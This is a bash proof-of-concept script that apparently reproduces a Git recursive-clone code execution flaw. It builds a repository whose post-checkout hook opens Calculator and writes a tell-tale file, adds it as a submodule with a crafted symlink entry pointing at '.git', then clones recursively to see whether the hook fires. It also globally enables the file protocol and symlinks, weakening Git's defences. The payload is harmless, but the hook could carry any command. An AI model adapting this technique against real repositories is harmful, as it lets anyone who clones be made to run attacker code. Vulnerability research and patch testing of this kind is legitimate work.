
#!/bin/bash

./clean.sh

# Enable detailed logging
LOGFILE="logfile.log"
function write_log {
    local message="$1"
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    echo "$timestamp - $message" | tee -a $LOGFILE
}

write_log "Starting the script"

set -e

trap 'write_log "An error occurred. Exiting."' ERR

# Global configuration to allow file protocol and use symlinks
git config --global protocol.file.allow always
write_log "Configured protocol.file.allow to always"

git config --global core.symlinks true
write_log "Configured core.symlinks to true"

# Define the tell-tale path
TELL_TALE_PATH="/tmp/looooooooooooooooooool.txt"

# Initialize and configure the hook repository
git init hook
write_log "Initialized hook repository"

pushd hook
mkdir -p y/hooks

echo "#" > empty
git add empty
# echo "n" > empty
# git add empty
# echo "n" > hooks/empty
# git add hooks/empty
# git commit -m "add-empty"

write_log "Created directory hooks in hook repository"

# Create the y/hooks/post-checkout script
cat << 'EOF' > y/hooks/post-checkout
open -a Calculator.app
echo hook-run > /tmp/looooooooooooooooooool.txt
EOF

write_log "Created y/hooks/post-checkout script"
git add y/hooks/post-checkout
git update-index --chmod=+x y/hooks/post-checkout
chmod uoa+x y/hooks/post-checkout
git commit -m "y/hooks/post-checkout"
write_log "Committed y/hooks/post-checkout script in hook repository"
popd

HOOK_REPO_PATH="$(pwd)/hook"
write_log "Hook repository path: $HOOK_REPO_PATH"

# Initialize and configure the captain repository
git init captain
write_log "Initialized captain repository"

pushd captain




git submodule add --name x/y "$HOOK_REPO_PATH" A/modules/x
git commit -m "add-submodule"
ls A/modules/x | tee -a logfile.log

# read  -n 1 -p "wait 0:" mainmenuinput

#mkdir -p A/modules/x
# echo "n" > A/modules/x/empty
# git add A/modules/x/empty
# git commit -m "add-empty"

write_log "Added submodule and committed in captain repository"

printf ".git" > dotgit.txt
DOT_GIT_HASH=$(git hash-object -w dotgit.txt)
#echo "120000 $DOT_GIT_HASH 0	a" > index.info
printf "120000 %s 0\ta\n" "$DOT_GIT_HASH" > index.info
git update-index --index-info < index.info

# read  -n 1 -p "wait 1:" mainmenuinput

#git add dotgit.txt index.info
rm index.info
rm dotgit.txt

git commit -m "add-symlink"
write_log "Added symlink and committed in captain repository"


# mkdir -p A/modules/x
# echo "n" > A/modules/x/empty
# git add A/modules/x/empty
# git commit -m "add-empty"

popd

# Ensure the tell-tale path does not exist
if [ -f "$TELL_TALE_PATH" ]; then
    write_log "Error: tell-tale path should not exist"
    
else
    write_log "Tell-tale path does not exist as expected"
fi

# stop 2
#read  -n 1 -p "wait 2:" mainmenuinput


# Try cloning the repository
git clone --recursive captain hooked 2>&1 | tee git_recursive_clone.log

# Check error log for the expected message
if grep -q "directory not empty" err.log; then
    write_log "Error message 'directory not empty' found in err.log"
else
    write_log "Expected error message 'directory not empty' not found in err.log"
    
fi

# Ensure the tell-tale path does not exist after clone attempt
if [ -f "$TELL_TALE_PATH" ]; then
    write_log "Error: tell-tale path should not exist after clone"
    
else
    write_log "Tell-tale path does not exist after clone as expected"
fi

write_log "Script completed successfully"


ls -la hooked/ | tee -a logfile.log
git config --global core.symlinks | tee -a logfile.log
